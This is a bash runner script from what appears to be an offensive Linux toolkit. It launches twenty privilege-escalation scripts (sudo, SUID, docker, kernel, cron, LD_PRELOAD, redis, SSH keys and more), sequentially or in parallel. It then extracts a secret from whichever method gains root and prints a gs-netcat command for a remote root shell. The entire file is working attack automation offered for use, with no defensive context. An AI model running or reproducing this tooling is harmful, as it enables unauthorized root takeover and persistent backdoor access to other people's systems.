#!/bin/bash
#==============================================================================
# DOOZ LPE RUNNER v2.0 - Parallel Execution of 20 LPE Methods
#==============================================================================
SCRIPT_DIR="$(dirname "$0")"
source "$SCRIPT_DIR/00_common.sh"

mkdir -p "$WORKDIR"
FINAL_RESULT="$WORKDIR/autoroot_result.json"

echo '{"status":"running","methods":['> "$FINAL_RESULT"

# Methods in priority order (most likely to succeed first)
METHODS=(
    "01_sudo.sh"
    "02_suid.sh"
    "03_passwd.sh"
    "04_docker.sh"
    "05_capabilities.sh"
    "07_cron.sh"
    "08_ldpreload.sh"
    "06_kernel.sh"
    "09_redis.sh"
    "10_passwords.sh"
    "14_lxd.sh"
    "15_systemd.sh"
    "11_nfs.sh"
    "12_path.sh"
    "13_dbus.sh"
    "16_sshkeys.sh"
    "17_mysql.sh"
    "18_tmux.sh"
    "19_pspy.sh"
    "20_final.sh"
)

ROOT_SECRET=""
ROOT_METHOD=""
first=1

run_method() {
    local m="$1"
    local script="$SCRIPT_DIR/$m"
    [ -x "$script" ] || chmod +x "$script"
    timeout 15 bash "$script" 2>/dev/null
}

# Run methods sequentially (safer) or parallel (faster)
MODE="${1:-sequential}"

if [ "$MODE" = "parallel" ]; then
    # Parallel execution - faster but may be noisy
    TMPDIR="$WORKDIR/lpe_out"
    mkdir -p "$TMPDIR"
    
    for m in "${METHODS[@]}"; do
        ( run_method "$m" > "$TMPDIR/${m%.sh}.out" 2>&1 ) &
    done
    wait
    
    # Collect results
    for m in "${METHODS[@]}"; do
        outfile="$TMPDIR/${m%.sh}.out"
        [ -f "$outfile" ] && {
            result=$(cat "$outfile")
            [ $first -eq 0 ] && echo "," >> "$FINAL_RESULT"
            first=0
            echo "$result" >> "$FINAL_RESULT"
            
            # Check for success
            echo "$result"|grep -q '"status":"success"' && {
                secret=$(echo "$result"|grep -oP '"secret":"\K[^"]+')
                method=$(echo "$result"|grep -oP '"method":"\K[^"]+')
                [ -n "$secret" ] && ROOT_SECRET="$secret" && ROOT_METHOD="$method"
            }
        }
    done
else
    # Sequential execution - quieter
    for m in "${METHODS[@]}"; do
        info "Running $m..."
        result=$(run_method "$m")
        
        [ $first -eq 0 ] && echo "," >> "$FINAL_RESULT"
        first=0
        echo "$result" >> "$FINAL_RESULT"
        
        # Check for root success - stop if found
        echo "$result"|grep -q '"status":"success"' && {
            secret=$(echo "$result"|grep -oP '"secret":"\K[^"]+')
            method=$(echo "$result"|grep -oP '"method":"\K[^"]+')
            if [ -n "$secret" ]; then
                ROOT_SECRET="$secret"
                ROOT_METHOD="$method"
                success "ROOT ACHIEVED via $method!"
                break
            fi
        }
    done
fi

# Finalize JSON
echo '],' >> "$FINAL_RESULT"

if [ -n "$ROOT_SECRET" ]; then
    echo '"root_achieved":true,' >> "$FINAL_RESULT"
    echo "\"root_secret\":\"$ROOT_SECRET\"," >> "$FINAL_RESULT"
    echo "\"root_method\":\"$ROOT_METHOD\"" >> "$FINAL_RESULT"
    
    success "========================================="
    success "ROOT ACCESS ACHIEVED!"
    success "Method: $ROOT_METHOD"
    success "Connect: gs-netcat -s $ROOT_SECRET -i"
    success "========================================="
else
    echo '"root_achieved":false,' >> "$FINAL_RESULT"
    echo '"root_secret":"",' >> "$FINAL_RESULT"
    echo '"root_method":""' >> "$FINAL_RESULT"
    
    warn "Root not achieved directly"
    warn "Check partial results for manual exploitation"
fi

echo '}' >> "$FINAL_RESULT"
cat "$FINAL_RESULT"
